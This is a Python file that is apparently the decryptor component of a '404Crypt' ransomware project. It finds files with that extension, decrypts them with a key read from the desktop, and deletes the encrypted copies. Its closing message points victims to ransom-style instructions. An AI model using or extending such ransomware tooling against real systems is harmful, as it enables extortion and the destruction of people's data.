import os
import cryptography.fernet
from Encrypt import Malicious
from cryptography.fernet import Fernet
from functools import lru_cache


class Decrypter(Malicious):

    def __init__(self):
        super().__init__()
        self.extensions = ["404Crypt"]
        self.enc_key = self.key_on_desktop()

    @lru_cache(4048)
    def __scramble(self, filepath, root=None, encrypted=True):
        global __data

        try:

            with open(self.enc_key, "rb") as symmetric_key:
                self.key = symmetric_key.read()
                self.cipher_object = Fernet(self.key)

        except TypeError as e:
            print("Decryption Impossible Key Not On Desktop")
            exit()

        # Decryption Process

        with open(filepath, "rb") as data_file:
            data = data_file.read()

        if encrypted:
            __data = self.cipher_object.decrypt(data)
            print(f"{filepath.split('/')[-1]} Decrypted Successfully.")

        _filepath = filepath.split(os.path.sep)[-1]
        _filepath = _filepath.split(".")[0] + "." + _filepath.split(".")[1]
        _filepath = os.path.join(root, _filepath)

        with open(_filepath, "wb") as file:
            file.write(__data)

        os.remove(filepath)  # Deleting 404CryptFile After Original File Restoration

    def fs_navigator(self, file_system, encrypted=True):
        try:

            for root, dr, files in file_system:
                for file in files:
                    # Obtaining Paths to @ file Iterated
                    file_path = os.path.join(root, file)

                    if file.split(".")[-1] in self.extensions:

                        if encrypted:
                            self.__scramble(root=root, filepath=file_path, encrypted=True)

        except cryptography.fernet.InvalidToken:
            print("Decryption Impossible .. Nothing to Decrypt")
        except ValueError as e:
            print("Decryption Impossible .. Invalid Key")


def main():
    malware_decrypt = Decrypter()
    try:
        malware_decrypt.crypt()
    except cryptography.fernet.InvalidToken:
        print("Decryption Impossible .. Nothing to Decrypt")


if __name__ == "__main__":
    try:
        main()
    except ValueError:
        print("Invalid or Encrypted Key Used\n\nFollow Given Instructions to retrieve Files")
